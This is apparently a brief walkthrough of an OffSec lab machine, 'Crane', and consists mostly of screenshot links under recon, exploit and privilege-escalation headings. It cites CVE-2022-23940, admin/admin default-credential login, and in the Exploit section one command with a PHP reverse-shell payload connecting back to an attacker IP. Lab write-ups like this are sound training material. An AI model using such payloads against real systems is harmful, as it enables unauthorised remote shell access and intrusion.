https://portal.offsec.com/machine/crane-52178/overview

## Introduce
![image](https://hackmd.io/_uploads/SyKKLYwvee.png)

## Reconnaissance
* CVE-2022-23940
![image](https://hackmd.io/_uploads/SkYl9FDvel.png)

* nmap
![image](https://hackmd.io/_uploads/SygJutvvlx.png)

* web page
![image](https://hackmd.io/_uploads/r1E-dKPvxx.png)
![image](https://hackmd.io/_uploads/rkvrutDwxg.png)

    * password guess
    `admin` & `admin`
    ![image](https://hackmd.io/_uploads/B1G0ttDPex.png)

## Walk Through
* Account Page
![image](https://hackmd.io/_uploads/rkmFqtPDel.png)

* About
![image](https://hackmd.io/_uploads/ry_72tDPgx.png)
![image](https://hackmd.io/_uploads/SksEntPPxg.png)

## Exploit
![image](https://hackmd.io/_uploads/ry8U6tPvxl.png)

`./exploit.py -h http://192.168.230.146/ -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.207\", 9962); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"`
![image](https://hackmd.io/_uploads/r1GqRFPvle.png)
![image](https://hackmd.io/_uploads/S1To0YvPxe.png)

## Privilege escalation
* sudo -l
![image](https://hackmd.io/_uploads/BklR1cDPlg.png)
![image](https://hackmd.io/_uploads/r1RMg9wDel.png)
![image](https://hackmd.io/_uploads/r17dgqPDxx.png)
![image](https://hackmd.io/_uploads/S1K3x5vDex.png)
